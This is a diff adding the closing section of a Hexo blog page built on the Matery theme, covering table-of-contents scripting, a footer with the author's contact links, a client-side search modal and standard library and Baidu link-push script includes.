+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">wuk0Ng</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
